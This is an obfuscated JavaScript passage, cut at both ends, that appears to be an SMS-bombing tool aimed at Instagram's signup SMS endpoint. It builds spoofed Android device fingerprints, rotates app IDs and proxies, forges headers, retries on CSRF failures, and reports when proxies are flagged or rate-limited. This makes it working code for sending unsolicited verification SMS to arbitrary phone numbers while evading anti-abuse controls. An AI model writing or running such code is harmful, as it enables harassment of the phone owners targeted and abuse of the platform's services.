'tMzdAG', 'CuX4Ea', 'wgTPDq', 'ks5tzq', 'uMnPBW', 'vLzvAG', 'mJu4', 'zxnFua', 'AwDSAq', 's01eqG', 'mJiY', 'nhW4Fa', 'BNvTCW', 'Bu1vBa', 'zuD2yq', 'ELn3BG', 'sNfqwG', 'y0LXAW', 'wxzpzq', 'wvbkyq', 'AgLFsq', 'idbDoG', 'u19dsa', 'wePAta', 'y2nVDq', 'rMH4BW', 'ndu3oa', 'rvLsCq', 'Cev0CG', 'Aw9UlG', 'zYbbyW', 'CZq6lW', 'wfrvra', 'uuTPvq', 'whnAzG', 'uKLArq', 'BeXWua', 'CwDjEa', 'igLUDG', 'zguUAG', 'CM9Yqq', 'yxq9', 'Ag8GiG', 'CgrtzG', 'g1SYsG', 'AeDbAW', 'B3jbyW', 'vvnFvW', 'ihrPBq', 'BIaGia', 'Aw1jBG', 'jg1Nia', 'icdILze', 'ieXVyW', 'DxaMzW', 'kguUzW', 'u1zTEq', 'tNzZsa', 'DNffzq', 'BLHxuG', 'zef6yq', 'AwvzAW', 'AxrFsq', 'g1SYsW', 'Awf3yW', 'zwqGzG', 'icPCka', 't0XmEa', 'BIbWAq', 'DMvFCa', 'Es1HzW', 'rg9zrW', 'BNvXAa', 'l3yXlW', 'AYC6', 'qMfuvG', 'iNn0yq', 'zwqUia', 'A2fFrW', 'C2LN', 'zw5Fva', 'BM93', 'DNzVCG', 'xsbduW', 'CNmGyq', 'osKG4Ocu', 'rw9byq', 'ngi1yq', 'D0DdAq', 'zxn0', 'AwnL', 'uvD4EG', 'tuTwtW', 'AsboBW', 'CMvHyW', 'CMnirq', 'mJa3', 'x2rLBa', 'yxnL', 'y2vjra', 'y1DAsW', 'BMjSBW', 'wuPeyq', 'teDJEG', 'BeDMvq', 'mtmWnq', 'CLPYvG', 'zNjFqW', 'ALfNwG', 'uMTwsq', 'A21ZyG', 'DxLmBa', 'mNW0Fa', 'vxfiDG', 'Agj5zG', 'r1zgBW', 'ChjVEa', 'sMH4vW', 'BuXLzW', 'Cvn2tG', 'sg93ia', 'zYb0BW', 'qxHbCq', 'swfxrW', 'ExHsCq', 'CMf3', 'yK9lAW', 'BMLUAW', 'rK9Pza', 'Bfznvq', 'veL3AG', 'uhDHDG', 's1fftq', 'BKXiqq', 'zw1PDa', 'DgvYia', '4OYO77Ipien1', 'Ecb0Aq', 'yM9Sza', 'tKnxva', 'ihWGsa', 'EwzdDq', 'u3n3vW', 'yMu0yq', 'Aw53CW', 'mhW1Fa', 'r0Pmsq', 'uvDfta', 'qMHTrq', 'yxDnBW', 'B1zhuW', 'tef1Ea', 'q1qGtG', 'CgfKuW', 'z2uOCW', '4Pwq4Pwq4Pwq4PwD', 'rfvJua', 'DwvZDa', 'yZKYyG', 'wNfkCq', 'Bej0vW', 'zcbMCG', 'u2vSzq', 'BNb0BG', 'mJqX', 'zw91Da', 'B3PZqG', 'qwP2sq', 'DgvY', 'zgzLCa', 'A2vKkq', 'rfn2Eq', 'icdILzeG', 'DcbJAa', 'ENvVyG', 'vgzOyG', 'tLDyDa', 'zNnduW', 'jgnWDq', 'BwvVDq', 'C2Hhyq', 'zLK9cG', 'DxrMoa', 'EhLZDa', 'yxjFsq', 'DwvoEG', 'AKLNAW', 'z3jHEq', 'tsbHCG', 'wgH2zW', 'mZiXnJC5mgDvBffQvW', 'A1L5Ca', 'zcbxqq', 'uhL3ta', 'tgz4rq', 'CMvSzq', 'AxzLCG', 'uvzyCW', 'mtG3nG', 'BuTgCW', 'DhjHDa', 't2fUsW', 'wxjyza', 'ntm2qG', 'rfz5tW', 'DhH0', 'B3mYmq', 'yMvYCW', 'mc41', 'twfRzq', 'yxnIqG', 'B3v0', 'A0HTvG', 's01hwG', 'yuruva', 'mY9Nzq', 'C29YDa', 'ie5Via', 'su1QrW', 'teLurq', 'BgDoCW', 'EgL0Aq', 'y09XEa', 'ALHhsa', 'DxDQwG', 'Bwf1Da', 'qufyzq', 'shLdCW', 'C3jzAa', 'AxnbCG', 'mJy1', 'CgfUDa', 'ndi3', 'z0DfBG', 'quTorW', 'lcb0Ca', 'Es50Ea', 'BfrPva', 'EcbRzq', 'icb8xW', 'zxfWzq', 'wfzRqW', 'luffuW', 'BvrUuq', 'p2nOyq', 'DgvU', 'BMrLBG', 'C2rdyW', 'wMDKEG', 'z3f0qG', 'wgHgDW', 'yxbWzq', 'wfrJAW', 'BcbuAq', 'B3vcrW', 'Bxb2DW', 'zxjfBG', 'wvDNrq', 'lte4ma', 's2v5oG', 'txDnBW', 'wwPmuq', 'CxPezW', 'zw50ia', 'yxzKsG', 'igjHBa', 'FdD8nG', 'zg9nDq', 'y2TbBG', 'CwnVBq', 'zerfAq', 'z2DLCG', 'Aw5Ozq', 'ytCXza', 'Egnbvq', 'CMvXDq', 'z29kzW', 'A3LFsW', 'BMv4xq', 'y1HJqW', 'ywnRjW', 'nJeZna', 'yxv0BW', 'EenVBG', 'AuXJta', 'B0XHsW', 'oIbuAq', 'rvjstW', 'qLjwtG', 'DhPhuW', 'zYbYzq', 'zxH5BG', 'vvjdrq', 'CKvnwG', 'vwzMsa', 'runLvW', 'DwHJqW', 'Ed0Wla', 'D0TgyG', 'zMLSzq', '8j+tUeLhka', 'qKnPqq', 'Dg8GCG', 'odq6rq', 'DMvgwa', 'BNqP', 'Bw90BW', 'mZK2ma', 'ywnKoa', 'uKvhsq', 'otyZ', 'sgn2Da', 'mtfLsgPQvMy', 'l3bYBW', 'mdq4na', 'ENP4ta', 'A0vRAG', 'zxnZAq', 'pI9Kzq', 'twvrtG', 'A0LdzW', 'te1srG', 'CMLTuW', 'rxHPDa', 'uM5ZyG', 'EfrUwq', 'xYbFxW', 'igLUCW', 'BuHWBW', 'icD8jW', 't1D2Eq', 'y2zjDq', 'Ec1Hzq', 'mxW0Fa', 'DwDXuW', 'DcaTrG', 'tM54Bq', 't2T6uG', 'wxnptW', 'lI4Ukq', 'CMvZBW', 'CIbJAa', 'DcaMia', 'CgfYCW', 'Axjlsa', 'sML5Ba', 'De9Ruq', 'ntK3', 'DhjPzW', 'qsaG8j+sRa', 'BeTrsq', 'vuTlEa', 'swfLDq', 'r2v0lq', '4Pwq4Pwq4Pwx', 'uhjVyW', 'tuLtuW', 'uuHUvq', 'q1LQCq', 'mtb8mq', 'sefPtq', 'BfrOCa', 'yxrPBW', 'vf9xqq', 'wxPvAq', 'rMDosW', 'zhjVAq', 'yxjFta', 'zY4GzG', 'uKyGCG', 'whPjzG', 'ihnLBa', 'zMzIBq', 'B21Tyq', 'vefdsW', 'tuTWzW', 't0zVsG', 'y1PbCW', 'BNzIEG', 'tKPHvq', 'r0nnxW', 'B3rOzq', 'z2v0ua', 'DeXAyG', 'w0vsuG', 'mJm0ma', 'ALnWzG', 'u3vJyW', 'Ee1QsG', 'zwzrBa', 'igzVCG', 'u0eTqW', 'BwTcza', 'BMfS', 'AY10Aq', 'mcaGia', 'Dhn3Aa', 'rhP1DW', 'tuL4Ea', 'rLzuyW', 'CKfJDa', 'whL5DW', 'EffqwG', 'D2j3zq', 'uejADW', 'AMXRzq', 'idePlG', 'EMf3rW', 'otyY', 'vMzmrq', 'A21FsW', 'vKL2Da', 'yMvtwq', 'vKTWuW', 'tNLpzW', 'uKHHta', 'uwr6Bq', 'DhntEq', 'z2Xqsq', '8j+hRpcFH6CGrgu', 'vvjmtW', 'xYKGFa', 'zxHPCW', 'v0Lgsq', 'zw5FvG', 're15CW', 'uK1ymW', 'BwL0zq', 'yxPFqq', 'A0XMAq', 'q1PIta', 'Cxj0va', 'zNLiEG', 'ic0Gsa', 'rur0BG', 'pvnvqW', 'qM9lyG', 'zgLNzq', 'tw5LAq', 'sKzfAW', 'B3jPzW', 'mJmY', 'q2XjCG', 'BKPcwG', 'Aw5HBa', 'y29VAW', 'BgvKia', 'ze9VtW', 'Ag9ZDa', 'mJq5', 'u3HwDa', 'DwX0', 'sLzSEG', 'DJeVCW', 'rgPXDW', 'z2v0BG', 'wxvXDa', 'ieHxsq', 'B2nLCW', 'wgfyvG', 'DgfYDa', '8j+tPIbbBa', 'BxDRvq', 'wMPnsW', 'sKLurG', 'suCGDa', 'zsaODa', 'qMXNva', 'ndu5', 'ndaWza', 'BxHmDW', 'zhmGka', 'C2fTCW', 'vwHrvq', 'suj0tW', 'BM90Aa', 'r3rNwq', 'g1SZsG', 'DxndBW', 'mJe2', 'we1vsa', '4PscifVIGki', 'CuXvta', 'uMn1vW', 'sMLNuW', 'zwnHuq', 'qvv3DG', 'ifrVBW', 'rfHdBq', 'AxrLia', 'n2mYzq', 'zsboBW', 'wgvIyW', 'Bu5YuG', 'zuDbCW', 'mtyYna', 'y3nfra', 'C05ntG', 'vNHmBa', 'AKTWwG', 't05NCG', 'qvjfxa', 'vhfzsW', 'AwqGsG', 'ueDHua', 'BePlua', 'DhvZiG', 'D2vY', 'yxjFsW', 'z3v0zq', 'C3rHBG', 'y2nNrW', 'DhvZpq', 'yxrLCG', 'u00TrW', 'DgvUCW', 'yxjFuq', 'sgzYrG', 'BNrPBG', 'Be9rEq', 'AYCGDa', 'D2Xzqq', 'AhPXEq', 'rKzg', 'wfGPla', 'BwLUvG', 'pYbBza', 'teTqsq', 'vu5tvW', 'Dg9VxW', 'EMXPyG', 'AgHzsG', 'xsbuCG', 'icaO', 'A2XJwG', 'zw4Uia', 'CYbWCG', 'EuTesq', 'uuXjrW', 'BsbtDa', 'qurfuG', 'sK5dBW', 'vNzTEq', 'EvbWrq', 'C0nUua', 'AhvFsa', 'z0fUuW', '8j+tSsbttq', 'iokuGIa', 'ihT9', 'AhHdAG', 'mJy2', 'BIbMyq', 'vfrqia', 'zw5Fsq', 't1v6ta', 'CgfNBq', 'zeToDa', 'yZG1za', 'u1zjyW', 'B2XLia', 'tgfZDa', 'AfHhsq', 'q3DVCW', 'mJy4', 'Duzgva', 'ugLVBG', 'v0D4za', 'Dvr2Dq', 'r015ta', 'rxH6zG', 'C0DIDG', 'DxnLCG', 'CYzPza', 'v2nura', 'uhjLBq', 'tg5kAq', 'EfzoCa', 'z1jgsq', 'wKrbAW', 'DgDFva', 'u3yXxW', 'nxW4Fa', 's0PWuG', 'yuzTtG', 'mNWZFa', 'qvbjia', 'BMv4yq', 'wxHsAa', 'suLxvG', 'r0Ldva', 'v1jtzG', 'B2TZBG', 'q2Pdsq', 'xY8GxW', 'CgHVBG', 'x251Bq', 'oIj3Aa', 'wZeVmW', 'ugHwvW', 'z09qqW', 'Ee5byq', 'AvbmBa', 'yKDftq', 'zhDWDG', 'DgLUDq', 'ugTIrq', 'CuzKrq', 'yJm1nq', 'vNnrCq', 'sxLWqq', 'otK4', 'CfrbzW', 'ywDYyq', 'r0nOyG', 'uvjXtq', 'rLn0tG', 'yxrL', 'B3vUDa', 'r0H0va', 'DwT3ua', 'iev4Aq', 'sMfpCq', 'tMfTzq', 'CgKUCa', 'DgvKia', 'zgHTCa', 'EvLhDa', 'AhjLyq', 'reLsrq', 'veHjza', 'C202mG', 'qvjSCq', 'wLHtuG', 'vhjStW', 'Dhj1yW', 'icGVCa', 'quniqq', 'ihvWBa', 'CdiVzW', 'se9xBW', 'BNrYEq', 'z010tG', 'AwnHDa', 'y2Xfqq', 'teXftG', 'C3LZyW', 'BM5Lza', 'suXtrq', 'rLvTqG', 'BuHvsa', 'oLTHlq', 'vKDqwG', 'CLPrrq'];
  fn1 = function () {
    return v180;
  };
  return fn1();
}
function sendRequest(v181, v182, v183, v184, v185 = null, v186 = 15000) {
  return new Promise((v187, v188) => {
    const v189 = new URL(v181),
      v190 = {
        ...v183
      };
    let v191 = v190;
    v184 && (v191["Content-Length"] = Buffer.byteLength(v184));
    const v192 = {
      'hostname': v189.hostname,
      'path': v189.pathname + v189.search,
      'method': v182,
      'headers': v191,
      'timeout': v186,
      'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
      'ecdhCurve': "X25519:P-256:P-384",
      'honorCipherOrder': false,
      'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1,
      'minVersion': "TLSv1.2"
    };
    let v193 = v185 ? parseProxy(v185) : null;
    if (v185) {
      if (!v193 || isNaN(v193.port) || v193.port <= 0) return v188(new Error("Invalid proxy"));
      v192.agent = createProxyAgent(v193);
    }
    const v194 = https.request(v192, v195 => {
      const v196 = [];
      v195.on("data", v197 => v196.push(v197));
      v195.on("error", v188), v195.on("end", () => {
        {
          let v198 = Buffer.concat(v196);
          const v199 = v195.headers["content-encoding"];
          if (v199 === "gzip") {
            try {
              v198 = zlib.gunzipSync(v198);
            } catch (v200) {}
          } else {
            if (v199 === "deflate") try {
              v198 = zlib.inflateSync(v198);
            } catch (v201) {} else {
              if (v199 === 'br') {
                try {
                  v198 = zlib.brotliDecompressSync(v198);
                } catch (v202) {}
              }
            }
          }
          v187({
            'status': v195.statusCode,
            'data': v198.toString("utf8"),
            'raw': v198,
            'headers': v195.headers
          });
        }
      });
    });
    v194.on("error", v188), v194.on("timeout", () => {
      v194.destroy();
      v188(new Error("timeout"));
    });
    if (v184) v194.write(v184);
    v194.end();
  });
}
function buildPayload(v203, v204, v205, v206, v207) {
  const v208 = {};
  v208.country_code = v205 ? v205.prefix : '1';
  v208.source = ["default"];
  const v209 = JSON.stringify([v208]),
    v210 = crypto.randomUUID(),
    v211 = v206 || crypto.randomUUID();
  const v212 = v207 || crypto.randomUUID(),
    v213 = new URLSearchParams({
      'phone_number': v203,
      'device_id': v204,
      'phone_id': v211,
      'guid': v210,
      '_uuid': v210,
      'waterfall_id': crypto.randomUUID(),
      'family_device_id': v212,
      'country_codes': v209,
      'android_build_type': "release",
      'qe_id': crypto.randomUUID(),
      'is_secondary_account_creation': "false"
    });
  return v213.toString();
}
const IG_APP_ID_POOL = ["567067343352427", "1217981644879628", "2028087190960484", "936619743392459", "1419724921674105"],
  v1 = {};
v1.minVer = 0x1ae, v1.maxVer = 0x1b3, v1.hash = "a8b6c3f921b4be8c739c13ef7c2e9d0f12a4567cdabb8b40a71dfa64b5a7f4be4a";
const v2 = {};
v2.minVer = 0x1b4, v2.maxVer = 0x1b9, v2.hash = "ce555e5500576acd8e84a66e8f9d0f35b35564cebb7b40a71dfa64b5a7f4be4a";
const v3 = {};
v3.minVer = 0x1ba, v3.maxVer = 0x1bf, v3.hash = "b9d2e1f045786acd9f95b77e8f9d0f35c46675dfcc8c51b82egb75c6b8g5cf5b";
const v4 = {};
v4.minVer = 0x1c0, v4.maxVer = 0x1c5, v4.hash = "f12a4567cdabb8b40a71dfa64b5a7f4be4ace555e5500576acd8e84a66e8f9d0f";
const v5 = {};
v5.minVer = 0x1c6, v5.maxVer = 0x1cc, v5.hash = "3d9c2f1b567aef84c92b6d1e0f45867abd9834ceeff7740b82fgc85d7c9f6de6c";
const BLOKS_VERSIONS = [v1, v2, v3, v4, v5];
function getBloksVersionForAppVer(v214) {
  for (const v215 of BLOKS_VERSIONS) {
    {
      if (v214 >= v215.minVer && v214 <= v215.maxVer) return v215.hash;
    }
  }
  return BLOKS_VERSIONS[1].hash;
}
function getRandomDevice() {
  const v216 = Math.floor(Math.random() * 31) + 430,
    v217 = Math.floor(Math.random() * 20),
    v218 = Math.floor(Math.random() * 200) + 100,
    v219 = v216 + ".0.0." + v217 + '.' + v218,
    v220 = {};
  v220.manu = "samsung", v220.model = "SM-G998B", v220.name = "p3s", v220.cpu = "exynos2100", v220.dpi = "480dpi", v220.res = "1080x2340";
  const v221 = {};
  v221.manu = "samsung", v221.model = "SM-S901B", v221.name = "r0q", v221.cpu = "exynos2200", v221.dpi = "480dpi", v221.res = "1080x2340";
  const v222 = {};
  v222.manu = "samsung", v222.model = "SM-S908B", v222.name = "b0q", v222.cpu = "exynos2200", v222.dpi = "480dpi", v222.res = "1080x2340";
  const v223 = {};
  v223.manu = "samsung", v223.model = "SM-A525F", v223.name = "a52q", v223.cpu = "sm7125", v223.dpi = "450dpi", v223.res = "1080x2400";
  const v224 = {};
  v224.manu = "samsung", v224.model = "SM-A536B", v224.name = "a53x", v224.cpu = "exynos1280", v224.dpi = "450dpi", v224.res = "1080x2400";
  const v225 = {};
  v225.manu = "samsung", v225.model = "SM-A156E", v225.name = "a15x", v225.cpu = "mt6835", v225.dpi = "400dpi", v225.res = "1080x2340";
  const v226 = {};
  v226.manu = "Xiaomi", v226.model = "Redmi Note 4", v226.name = "mido", v226.cpu = "qcom", v226.dpi = "420dpi", v226.res = "1080x1920";
  const v227 = {};
  v227.manu = "Xiaomi", v227.model = "M2101K6G", v227.name = "sweet", v227.cpu = "sm7150", v227.dpi = "440dpi", v227.res = "1080x2400";
  const v228 = {};
  v228.manu = "Xiaomi", v228.model = "2201117TG", v228.name = "spes", v228.cpu = "sm6225", v228.dpi = "440dpi", v228.res = "1080x2400";
  const v229 = {};
  v229.manu = "Xiaomi", v229.model = "2109119DG", v229.name = "lisa", v229.cpu = "sm7325";
  v229.dpi = "400dpi", v229.res = "1080x2400";
  const v230 = {};
  v230.manu = "OnePlus", v230.model = "ONEPLUS A6013", v230.name = "OnePlus6T", v230.cpu = "sdm845", v230.dpi = "420dpi", v230.res = "1080x2340";
  const v231 = {};
  v231.manu = "OnePlus", v231.model = "KB2003", v231.name = "OnePlus8T", v231.cpu = "sm8250", v231.dpi = "450dpi", v231.res = "1080x2400";
  const v232 = {};
  v232.manu = "Google", v232.model = "Pixel 6", v232.name = "oriole", v232.cpu = "tensor", v232.dpi = "420dpi", v232.res = "1080x2400";
  const v233 = {};
  v233.manu = "Google", v233.model = "Pixel 7", v233.name = "panther", v233.cpu = "tensor", v233.dpi = "420dpi", v233.res = "1080x2400";
  const v234 = {};
  v234.manu = "Google", v234.model = "Pixel 8 Pro", v234.name = "husky", v234.cpu = "tensor", v234.dpi = "450dpi", v234.res = "1344x2992";
  const v235 = {};
  v235.manu = "Oppo", v235.model = "CPH2173", v235.name = "FindX3", v235.cpu = "sm8350", v235.dpi = "480dpi", v235.res = "1080x2400";
  const v236 = {};
  v236.manu = "Oppo", v236.model = "CPH2207", v236.name = "Reno5", v236.cpu = "sm7250", v236.dpi = "480dpi", v236.res = "1080x2400";
  const v237 = {};
  v237.manu = "Motorola", v237.model = "motorola edge 30", v237.name = "dubai", v237.cpu = "sm7325", v237.dpi = "400dpi", v237.res = "1080x2400";
  const v238 = {};
  v238.manu = "vivo", v238.model = "V2109", v238.name = "Y33s";
  v238.cpu = "mt6769", v238.dpi = "400dpi", v238.res = "1080x2400";
  const v239 = {};
  v239.manu = "realme", v239.model = "RMX3363", v239.name = "GT_Master_Edition", v239.cpu = "sm7325";
  v239.dpi = "480dpi", v239.res = "1080x2400";
  const v240 = [v220, v221, v222, v223, v224, v225, v226, v227, v228, v229, v230, v231, v232, v233, v234, v235, v236, v237, v238, v239],
    v241 = v240[Math.floor(Math.random() * v240.length)],
    v242 = ['10', '11', '12', '13', '14', '15'][Math.floor(Math.random() * 6)],
    v243 = {};
  v243['10'] = '29', v243['11'] = '30', v243['12'] = '31', v243['13'] = '33', v243['14'] = '34', v243['15'] = '35';
  const v244 = v243[v242],
    v245 = arguments.length > 0 ? arguments[0] : "en_US",
    v246 = Math.floor(Math.random() * 90000000) + 450000000;
  return "InstagramCarbon/" + v219 + " (Android " + v244 + '/' + v242 + ';\x20' + v241.dpi + ';\x20' + v241.res + ';\x20' + v241.manu + ';\x20' + v241.model + ';\x20' + v241.name + ';\x20' + v241.cpu + ';\x20' + v245 + ';\x20' + v246 + ')';
}
function getRandomConnectionQuality() {
  const v247 = Math.floor(Math.random() * 30) + 10,
    v248 = Math.floor(Math.random() * 8000) + 5000;
  const v249 = Math.floor(Math.random() * 50) + 10;
  return "EXCELLENT; q=0.9, rtt=" + v247 + ", rtx=0, c=10, mss=1400, tbw=" + v248 + ", tp=-1, tpl=-1, uplat=" + v249 + ", ullat=0";
}
async function triggerSms(v250, v251 = {}) {
  const {
    onStatus = () => {},
    timeout = 15000,
    languagePref = 'en'
  } = v251;
  let v252 = v251.proxy || null;
  const v253 = normalizePhoneNumber(v250),
    v254 = v253.replace('+', ''),
    v255 = "android-" + crypto.randomBytes(8).toString("hex"),
    v256 = crypto.randomUUID(),
    v257 = crypto.randomUUID(),
    v258 = crypto.createHash("md5").update(v254 + RUN_SALT).digest("hex"),
    v259 = parseInt(v258.slice(0, 4), 16) % IG_APP_ID_POOL.length,
    v260 = IG_APP_ID_POOL[v259],
    v261 = getPhoneDetails(v254);
  let v262 = "en_US";
  if (languagePref === "auto") v262 = v261.locale;else {
    if (languagePref !== 'en') {
      {
        let v279 = languagePref.replace('=', '-').trim();
        if (v279.length === 5 && v279.includes('-')) {
          {
            const v280 = v279.split('-'),
              v281 = v280[0].toLowerCase(),
              v282 = v280[1].toUpperCase();
            v262 = v281 + '_' + v282;
          }
        } else v262 = v279.replace('-', '_').split(',')[0];
      }
    } else v262 = "en_US";
  }
  const v263 = {};
  v263.type = "region";
  const v264 = new Intl.DisplayNames(['en'], v263);
  let v265 = "Unknown";
  try {
    const v283 = v262.split('_')[1];
    if (v283) v265 = v264.of(v283);
  } catch (v284) {}
  let v266 = "Direct";
  if (v252 && v252.user) {
    {
      const v285 = v252.user.match(/(?:country|cc|cr|zone|region)[-_.]?([a-zA-Z]{2})(?:[-_.]|$)/i) || v252.user.match(/[-_]([a-zA-Z]{2})[-_]sess/i);
      if (v285) {
        try {
          v266 = v264.of(v285[1].toUpperCase()) || v285[1].toUpperCase();
        } catch (v286) {
          v266 = v285[1].toUpperCase();
        }
      } else v266 = "Unknown";
    }
  }
  const v267 = getRandomDevice(v262),
    v268 = v267.match(/InstagramCarbon\/(\d+)/),
    v269 = v268 ? parseInt(v268[1]) : 440,
    v270 = getBloksVersionForAppVer(v269);
  onStatus("[1/2] Constructing Payload...");
  const v271 = buildPayload(v253, v255, v261, v256, v257);
  onStatus("[2/2] Triggering SMS (" + v267.split('\x20')[0] + ")...");
  const v272 = "https://i.instagram.com/api/v1/accounts/send_signup_sms_code/",
    v273 = v262.split('_'),
    v274 = v273.length === 2 ? v273[0] + '-' + v273[1] + ',\x20' + v273[0] + ";q=0.9" : v262.replace('_', '-') + ";q=0.9, en;q=0.8",
    v275 = {
      'User-Agent': v267,
      'Accept': "*/*",
      'Accept-Language': v274,
      'Accept-Encoding': "gzip",
      'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
      'X-FB-HTTP-Engine': "Liger",
      'x-fb-connection-quality': getRandomConnectionQuality(),
      'X-IG-Connection-Speed': Math.floor(Math.random() * 5000) + 2000 + "kbps",
      'X-IG-Bandwidth-Speed-KBPS': "-1.000",
      'X-IG-Bandwidth-TotalBytes-B': '0',
      'X-IG-Bandwidth-TotalTime-MS': '0',
      'X-IG-App-Locale': v262,
      'X-IG-Device-Locale': v262,
      'X-IG-Mapped-Locale': v262,
      'X-IG-Timezone-Offset': v261.offset,
      'X-IG-Connection-Type': "WIFI",
      'X-IG-Capabilities': "3brTv10=",
      'X-IG-App-ID': v260,
      'X-IG-Device-ID': v255,
      'X-IG-Android-ID': v255,
      'X-IG-CLIENT-ENDPOINT': "com.igcarbon.registration:com.igcarbon.registration",
      'X-IG-Is-Foldable': "false",
      'X-IG-WWW-Claim': '0',
      'X-MID': crypto.randomBytes(16).toString("base64").replace(/[+/=]/g, '').substring(0, 10) + 'X8' + crypto.randomBytes(4).toString("base64").replace(/[+/=]/g, '').substring(0, 3) + 'Q',
      'X-Pigeon-Session-Id': "UFS-" + crypto.randomUUID(),
      'X-Pigeon-Rawclienttime': (Date.now() / 1000).toFixed(3),
      'X-Bloks-Version-Id': v270,
      'X-Bloks-Is-Layout-RTL': "false",
      'Priority': "u=3, i",
      'Connection': "Keep-Alive"
    };
  let v276 = "missing",
    v277 = '';
  const v278 = crypto.randomUUID();
  try {
    onStatus("[1/3] Fetching session tokens...");
    const v287 = "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=" + v278.replace(/-/g, '');
    try {
      {
        const v297 = await sendRequest(v287, "GET", v275, null, v252, timeout);
        if (v297.headers["set-cookie"]) {
          {
            const v301 = Array.isArray(v297.headers["set-cookie"]) ? v297.headers["set-cookie"].join(';') : v297.headers["set-cookie"],
              v302 = v301.match(/csrftoken=([^;,\s]+)/),
              v303 = v301.match(/mid=([^;,\s]+)/),
              v304 = v301.match(/ig_did=([^;,\s]+)/);
            if (v302) v276 = v302[1];
            const v305 = [];
            if (v276 !== "missing") v305.push("csrftoken=" + v276);
            if (v303) v305.push("mid=" + v303[1]);
            if (v304) v305.push("ig_did=" + v304[1]);
            v277 = v305.join(';\x20');
          }
        }
        const v298 = v297.headers["x-stack"] || "unknown",
          v299 = v297.headers["x-ig-push-state"] || '-',
          v300 = v297.headers["x-aed"] || '-';
        dbg(v254, "FETCH_HEADERS HTTP " + v297.status, null, {
          'stack': v298,
          'push-state': v299,
          'aed': v300,
          'csrf': v276 !== "missing" ? "GOT" : "MISSING",
          'appId': v260
        });
      }
    } catch (v306) {}
    onStatus("[2/3] Triggering SMS...");
    v276 !== "missing" && (v275["X-CSRFToken"] = v276, v275.Cookie = v277);
    let v288 = await sendRequest(v272, "POST", v275, v271, v252, timeout),
      v289 = v288.data;
    if (v288.status === 403 && v289.includes("CSRF")) {
      {
        onStatus("[3/3] CSRF retry...");
        if (v288.headers["set-cookie"]) {
          const v307 = Array.isArray(v288.headers["set-cookie"]) ? v288.headers["set-cookie"].join(';') : v288.headers["set-cookie"],
            v308 = v307.match(/csrftoken=([^;,\s]+)/),
            v309 = v307.match(/mid=([^;,\s]+)/),
            v310 = v307.match(/ig_did=([^;,\s]+)/);
          if (v308) v276 = v308[1];
          const v311 = [];
          if (v276 !== "missing") v311.push("csrftoken=" + v276);
          if (v309) v311.push("mid=" + v309[1]);
          if (v310) v311.push("ig_did=" + v310[1]);
          v277 = v311.join(';\x20'), v275["X-CSRFToken"] = v276, v275.Cookie = v277;
        }
        v288 = await sendRequest(v272, "POST", v275, v271, v252, timeout), v289 = v288.data;
      }
    }
    const v290 = v252 ? v252.host + ':' + v252.port + '\x20(' + (v252.user ? v252.user : "No Auth") + ')' : "DIRECT",
      v291 = v288.headers["x-stack"] || "unknown",
      v292 = v288.headers["x-aed"] || '-',
      v293 = v288.headers["x-ig-peak-time"] || '-',
      v294 = v288.headers["x-ig-server-region"] || v288.headers["x-ig-origin-region"] || '-',
      v295 = v288.headers["x-ig-request-elapsed-time-ms"] || '-';
    dbg(v254, "HTTP " + v288.status, v289, {
      'stack': v291,
      'aed': v292,
      'peak-time': v293,
      'region': v294,
      'elapsed-ms': v295,
      'proxy': v290,
      'csrf': v276 !== "missing" ? 'OK' : "MISSING",
      'appId': v260,
      'ua': v267.split('\x20')[0]
    });
    if (v291 === "www") {
      {
        const v312 = {};
        v312.proxy = v290, dbg(v254, "⚠️  STACK SHIFT → www", "IG is routing to web challenge layer (IP rate-limited)", v312);
      }
    }
    const v296 = v288.headers["x-ig-push-state"] || '-';
    if (v296 === 'c2') {
      const v313 = {};
      v313.proxy = v290, dbg(v254, "📌 PUSH-STATE c2", "IG tracking this session — proxy IP is flagged for repeat sends", v313);
    }
    if (v288.status === 200) {
      const v314 = v289.includes("\"ok\"") || v289.includes("\"status\":\"ok\"") || v289.includes("\"status\": \"ok\"") || v289.includes("age_required") || v289.includes("age_check") || /\x00\x01ok/.test(v288.raw.toString("binary")) || /\x00\x01success/.test(v288.raw.toString("binary"));
      if (v314) {
        const v315 = v289.match(/"tos_version"\s*:\s*"([^"]+)"/),
          v316 = v315 ? v315[1].toLowerCase() : '',
          v317 = v289.includes("\"otp_delivery_method\":\"whatsapp\"") || v289.includes("\"otp_method\":\"whatsapp\"") || v289.includes("\"whatsapp\"") && !v289.includes("\"tos_version\""),
          v318 = v289.includes("age_required") || v289.includes("age_check");
        if (v317) {
          onStatus("[1/1] 💬 WhatsApp OTP routed (EU number)");
          const v320 = {};
          return v320.success = true, v320.whatsapp = true, v320.message = "WhatsApp OTP routed (EU - not SMS)", v320.phone = v253, v320.langName = v262, v320.proxyCountryName = v266, v320.numberCountryName = v265, v320;
        }
        if (v318) {
          onStatus("[1/1] ✅ SMS triggered (age gate — OTP sent)");
          const v321 = {};
          return v321.success = true, v321.whatsapp = false, v321.ageGated = true, v321.message = "SMS triggered (age gate)", v321.phone = v253, v321.langName = v262, v321.proxyCountryName = v266, v321.numberCountryName = v265, v321;
        }
        onStatus("[1/1] ✅ SMS successfully triggered");
        const v319 = {};
        return v319.success = true, v319.whatsapp = false, v319.message = "SMS successfully triggered", v319.phone = v253, v319.langName = v262, v319.proxyCountryName = v266, v319.numberCountryName = v265, v319;
      } else {
        let v322 = "Blocked response (rate-limited or challenge) — no OTP sent";
        if (v289.includes("challenge")) v322 = "Challenge required (proxy flagged by IG)";
        if (v289.includes("429") || v289.includes("too_many")) v322 = "Rate limited (429) — proxy exhausted";
        if (v289.includes("checkpoint")) v322 = "Checkpoint required";
        if (v289.includes("spam")) v322 = "Spam flag on this proxy/number";
        const v323 = {};
        return v323.success = false, v323.message = "Failed: " + v322 + " - HTTP 200", v323.phone = v253, v323.langName = v262, v323.proxyCountryName = v266, v323.numberCountryName = v265, v323;
      }
    } else {
      {
        let v324 = "Unknown Error";
        if (v289.includes("fail")) v324 = "Failed (Check proxy or limits)";
